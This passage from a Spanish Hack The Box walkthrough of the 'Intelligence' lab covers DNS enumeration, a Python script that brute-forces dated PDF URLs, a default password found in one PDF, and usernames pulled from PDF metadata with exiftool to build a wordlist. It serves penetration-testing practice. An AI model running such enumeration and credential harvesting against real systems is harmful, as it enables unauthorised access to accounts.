&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/intelligence ❯ ~/tools/dnscan/dnscan.py -d intelligence.htb -w ~/tools/dnscan/all.txt -R 10.10.10.248 -n
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Processing domain intelligence.htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Using specified resolvers: 10.10.10.248
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting nameservers
10.10.10.248 - dc.intelligence.htb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Zone transfer failed

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; IPv6 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;AAAA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; records found. Try running dnscan with the -6 option.
dead:beef::3d59:f88a:8e8d:a571

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; DNSSEC not supported

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Scanning intelligence.htb &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; A records
10.10.10.248 - intelligence.htb
10.10.10.248 - dc.intelligence.htb
10.10.10.248 - domaindnszones.intelligence.htb
10.10.10.248 - forestdnszones.intelligence.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;documentos&#34;&gt;Documentos&lt;/h2&gt;
&lt;p&gt;Los PDFs que se muestran en la pagina estan dentro de &lt;code&gt;/documents/&lt;/code&gt; y cada uno de ellos tiene una fecha mas el valor &lt;strong&gt;&amp;lsquo;upload&amp;rsquo;&lt;/strong&gt;, creamos un pequeño script en python para realizar una enumeracion de documentos existentes para buscar informacion sensible.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;zero&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2015&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2023&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Init: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
            &lt;span class=&#34;c1&#34;&gt;# Ex: http://intelligence.htb/documents/2020-12-30-upload.pdf&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://intelligence.htb/documents/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zero&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;zero&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;-upload.pdf&amp;#34;&lt;/span&gt;
            &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status_code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;404&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
                &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Finish: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras ejecutar el script encontramos una gran cantidad de documentos, abrimos cada uno de estos y solo en dos de ellos encontramos informacion relacionada a una  cuenta de usuario y actualizacion de parte de &lt;em&gt;&amp;lsquo;IT&amp;rsquo;&lt;/em&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;π ~/htb/intelligence ❯ ./enum_docs.py
Init: &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt;
Finish: &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt;
Finish: &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt;
Finish: &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;
Finish: &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
Finish: &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
http://intelligence.htb/documents/2020-06-04-upload.pdf &amp;lt;&amp;lt;-------
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
http://intelligence.htb/documents/2020-12-24-upload.pdf
http://intelligence.htb/documents/2020-12-28-upload.pdf
http://intelligence.htb/documents/2020-12-30-upload.pdf &amp;lt;&amp;lt;-------
Finish: &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
http://intelligence.htb/documents/2021-01-03-upload.pdf
http://intelligence.htb/documents/2021-01-14-upload.pdf
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
http://intelligence.htb/documents/2021-03-25-upload.pdf
http://intelligence.htb/documents/2021-03-27-upload.pdf
Finish: &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt;
Init: &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;
Finish: &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Intentamos utilizar la contraseña y usuario (&lt;code&gt;NewIntelligenceCorpUser9876:Ted&lt;/code&gt;) pero en ningun puerto/servicio fue aceptada la combinacion.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# http://intelligence.htb/documents/2020-06-04-upload.pdf&lt;/span&gt;
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible

&lt;span class=&#34;c1&#34;&gt;# http://intelligence.htb/documents/2020-12-30-upload.pdf&lt;/span&gt;
Internal IT Update
There has recently been some outages on our web servers. Ted has gotten a script in place to &lt;span class=&#34;nb&#34;&gt;help&lt;/span&gt; notify us &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; this happens again.
Also, after discussion following our recent security audit we are in the processof locking down our service accounts.
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;exiftool&#34;&gt;Exiftool&lt;/h2&gt;
&lt;p&gt;Tras ejecutar exiftool a los PDFs vemos posibles nombres de usuarios en los metadatos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;π ~/htb/intelligence/docs ❯ exiftool *
&lt;span class=&#34;o&#34;&gt;========&lt;/span&gt; 2020-06-04-upload.pdf
ExifTool Version Number         : 12.16
File Name                       : 2020-06-04-upload.pdf
Directory                       : .
File Size                       : &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; KiB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2021:07:08 03:17:02-04:00
File Inode Change Date/Time     : 2021:07:08 03:16:59-04:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
Creator                         : Jason.Patterson
&lt;span class=&#34;o&#34;&gt;========&lt;/span&gt; 2020-12-30-upload.pdf
ExifTool Version Number         : 12.16
File Name                       : 2020-12-30-upload.pdf
Directory                       : .
File Size                       : &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; KiB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2021:07:08 03:17:13-04:00
File Inode Change Date/Time     : 2021:07:08 03:17:10-04:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
Creator                         : Jason.Patterson
    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; image files &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt;
 π ~/htb/intelligence/docs ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Con algunas modificaciones en el script y con informacion que encontramos creamos el wordlist &lt;code&gt;users.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/usr/bin/env python3
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;import requests, exiftool, wget, glob, os
&lt;span class=&#34;c1&#34;&gt;# pip3 install PyExifTool&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# pip3 install wget&lt;/span&gt;

def zero&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; str&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; int&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; str&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;+str&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;n&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;

def get_usernames&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;files: list&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
    &lt;span class=&#34;nv&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;
    with exiftool.ExifTool&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; as et:
        &lt;span class=&#34;nv&#34;&gt;metadata&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; et.get_metadata_batch&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;files&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; d in metadata:
        user.append&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;d&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PDF:Creator&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;       
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; user

&lt;span class=&#34;c1&#34;&gt;# All .pdf&lt;/span&gt;
